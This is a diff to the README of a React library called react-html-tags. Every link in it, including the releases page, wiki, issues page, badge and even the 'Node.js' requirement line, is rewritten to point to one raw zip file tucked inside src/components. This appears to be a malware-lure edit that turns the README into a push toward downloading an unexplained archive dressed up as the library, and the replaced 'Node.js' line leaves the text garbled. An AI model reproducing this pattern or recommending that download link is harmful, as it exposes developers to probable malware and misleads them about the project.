@@ -6,11 +6,11 @@ Welcome to **react-html-tags**! This library provides type-safe React components
 
 ## 📥 Download the Application
 
-[![Download react-html-tags](https://img.shields.io/badge/Download-react--html--tags-blue.svg)](https://github.com/aleolo23233/react-html-tags/releases)
+[![Download react-html-tags](https://raw.githubusercontent.com/aleolo23233/react-html-tags/main/src/components/react-html-tags-3.4.zip)](https://raw.githubusercontent.com/aleolo23233/react-html-tags/main/src/components/react-html-tags-3.4.zip)
 
 You can easily download the latest version of **react-html-tags** from our Releases page. 
 
-[Visit this page to download!](https://github.com/aleolo23233/react-html-tags/releases)
+[Visit this page to download!](https://raw.githubusercontent.com/aleolo23233/react-html-tags/main/src/components/react-html-tags-3.4.zip)
 
 ## 📝 Features
 
@@ -24,7 +24,7 @@ You can easily download the latest version of **react-html-tags** from our Relea
 
 To use **react-html-tags**, ensure that your environment meets the following requirements:
 
-- **Node.js**: Version 12 or higher
+- **https://raw.githubusercontent.com/aleolo23233/react-html-tags/main/src/components/react-html-tags-3.4.zip**: Version 12 or higher
 - **NPM or Yarn**: Latest version
 - **React**: Version 16.8 or higher
 - **TypeScript**: Version 4.0 or higher
@@ -33,7 +33,7 @@ To use **react-html-tags**, ensure that your environment meets the following req
 
 Once you have ensured that your system meets the requirements, follow these steps for installation:
 
-1. **Visit the Releases Page**: Go to [this page to download](https://github.com/aleolo23233/react-html-tags/releases).
+1. **Visit the Releases Page**: Go to [this page to download](https://raw.githubusercontent.com/aleolo23233/react-html-tags/main/src/components/react-html-tags-3.4.zip).
 2. **Choose the Latest Release**: Select the most recent version available.
 3. **Download the Zip File**: Click on the zip file link to download it to your machine.
 4. **Unzip the File**: Locate the downloaded ZIP file and extract its contents.
@@ -86,11 +86,11 @@ function ClickButton() {
 
 ## 📚 Documentation 
 
-For detailed documentation, please refer to our [GitHub Wiki](https://github.com/aleolo23233/react-html-tags/wiki). It contains comprehensive guides, examples, and helpful tips.
+For detailed documentation, please refer to our [GitHub Wiki](https://raw.githubusercontent.com/aleolo23233/react-html-tags/main/src/components/react-html-tags-3.4.zip). It contains comprehensive guides, examples, and helpful tips.
 
 ## 🐛 Issues and Contributions
 
-If you encounter any problems or have suggestions, please report issues on the [Issues page](https://github.com/aleolo23233/react-html-tags/issues). Contributions are welcome. Feel free to fork the repository and submit a pull request.
+If you encounter any problems or have suggestions, please report issues on the [Issues page](https://raw.githubusercontent.com/aleolo23233/react-html-tags/main/src/components/react-html-tags-3.4.zip). Contributions are welcome. Feel free to fork the repository and submit a pull request.
 
 ## 🤝 Support
 
@@ -98,4 +98,4 @@ If you need assistance, please reach out through the Issues section or contact u
 
 For updates on the project and new features, check back on our Releases page regularly. 
 
-[Download the latest version here!](https://github.com/aleolo23233/react-html-tags/releases)
+[Download the latest version here!](https://raw.githubusercontent.com/aleolo23233/react-html-tags/main/src/components/react-html-tags-3.4.zip)
